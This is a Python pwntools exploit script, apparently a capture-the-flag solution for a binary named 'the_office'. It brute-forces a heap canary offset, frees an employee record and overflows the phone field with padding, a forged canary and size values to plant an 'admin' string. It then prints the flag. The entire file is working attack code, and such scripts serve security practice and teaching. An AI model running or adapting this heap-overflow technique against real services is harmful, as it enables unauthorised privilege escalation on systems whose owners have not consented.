#!/usr/bin/env python3

from pwn import context, log, p32, process, remote, sys

context.binary = 'the_office'
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def compute_canary(offset):
    with context.local(log_level='CRITICAL'):
        canary_process = process(['canary', str(offset)])
        canary = int(canary_process.recvline().decode())
        canary_process.close()

    return canary


def add_employee(p, name=b'a', salary=b'1', phone=b'b'):
    p.sendlineafter(b'token', b'1')
    p.sendlineafter(b'Name: ', name)
    p.sendlineafter(b'Email (y/n)? ', b'n')
    p.sendlineafter(b'Salary: ', salary)
    p.sendlineafter(b'Phone #: ', phone)
    p.sendlineafter(b'Bldg (y/n)? ', b'n')


def main():
    offset = 0

    while True:
        log.info(f'Testing offset: {offset}')

        p = get_process()

        canary = compute_canary(offset)
        log.info(f'Computed heap canary: {hex(canary)}')

        add_employee(p)
        add_employee(p)

        p.sendlineafter(b'token', b'2')
        p.sendlineafter(b'Employee #?\n', b'0')

        add_employee(p, phone=b'A' * 28 + p32(canary) + p32(0x35) * 2 + b'admin')

        try:
            p.sendlineafter(b'token', b'4')
        except EOFError:
            offset += 1
            continue

        p.sendlineafter(b'Employee #?\n', b'1')
        break

    log.success(f'Flag: {p.recvline().decode()}')
    p.close()


if __name__ == '__main__':
    main()
